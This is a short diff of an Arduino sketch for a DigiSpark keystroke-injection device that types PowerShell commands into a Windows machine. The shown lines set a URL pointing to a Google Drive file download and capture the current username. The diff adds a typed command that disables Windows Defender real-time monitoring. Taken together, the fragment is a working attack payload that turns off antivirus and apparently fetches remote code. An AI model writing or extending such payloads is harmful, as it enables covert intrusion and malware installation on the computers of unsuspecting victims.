@@ -27,6 +27,9 @@ DigiKeyboard.delay(3*runspeed);
 DigiKeyboard.println("$url = \"https://drive.google.com/uc?export=download&id=13dltw-ftkkfpryac2dzqnm7jurzzqhqs\"");
 DigiKeyboard.update();
 DigiKeyboard.delay(1*runspeed);
+DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
+DigiKeyboard.update();
+DigiKeyboard.delay(3*runspeed);
 //grabs user name based on logged on user and stores it in $user
 DigiKeyboard.println("$user = [environment]::username");
 DigiKeyboard.update();
